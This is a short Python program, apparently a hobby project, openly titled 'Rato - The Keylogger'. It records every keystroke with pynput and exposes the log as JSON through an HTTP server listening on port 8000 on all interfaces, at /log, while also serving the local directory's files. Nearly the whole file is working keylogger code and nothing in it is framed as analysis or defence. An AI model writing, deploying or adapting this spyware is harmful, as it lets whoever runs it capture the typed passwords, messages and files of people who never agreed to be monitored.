from http.server import SimpleHTTPRequestHandler, HTTPServer  # Importing HTTP server modules
import threading  # Importing threading for running the server in parallel
from pynput import keyboard  # Importing keyboard module for key logging
import json  # Importing JSON to format log output

from art import text2art  # Importing text2art to generate ASCII text
from colorama import Fore, Style  # Importing colorama for colored terminal output

# ASCII representation of a rat for the project
rat_art = """
      (\__/)
      (o'ᴥ'o)  Rato - The Keylogger
      (")_(")
"""

# Try to generate and display ASCII art for the project name
try:
    ascii_art = text2art("Rato", font="big")  # Generate ASCII text
    print(Fore.CYAN + ascii_art + Style.RESET_ALL)  # Print ASCII text in cyan
    print(Fore.YELLOW + rat_art + Style.RESET_ALL)  # Print ASCII rat art in yellow
except Exception as e:
    print(Fore.RED + "Erro ao gerar ASCII Art:", e, Style.RESET_ALL)  # Print error in red if generation fails

registro_teclas = []  # Create an empty list to store keystrokes

# Function to handle key press events
def tecla_pressionada(tecla):
    print(f'Tecla {tecla} pressionada')  # Print the key pressed
    try:
        registro_teclas.append(tecla.char)  # Add the character to the log
    except AttributeError:
        registro_teclas.append(f' [{tecla}] ')  # Handle special keys
    except Exception as e:
        registro_teclas.append(f' [Erro: {e}] ')  # Handle any unexpected errors

# Function to handle key release events
def ao_soltar(tecla):
    if tecla == keyboard.Key.esc:  # Stop the logger if 'Esc' key is pressed
        return False

# HTTP handler class to serve logs
class ManipuladorKeyLogger(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/log':  # If request is made to '/log'
            self.send_response(200)  # Send HTTP 200 OK
            self.send_header('Content-type', 'application/json')  # Set response type to JSON
            self.end_headers()
            self.wfile.write(json.dumps({'log': registro_teclas}).encode('utf-8'))  # Send keystroke log as JSON
        else:
            super().do_GET()  # Handle other requests normally

# Function to start the HTTP server
def iniciar_servidor():
    endereco_servidor = ('', 8000)  # Set server to listen on port 8000
    httpd = HTTPServer(endereco_servidor, ManipuladorKeyLogger)  # Create server instance
    httpd.serve_forever()  # Keep the server running

if __name__ == '__main__':  # Main function
    threading.Thread(target=iniciar_servidor).start()  # Start the server in a separate thread

    # Start key listener and keep running
    with keyboard.Listener(on_press=tecla_pressionada, on_release=ao_soltar) as listener: 
        listener.join()  # Wait for the listener to finish
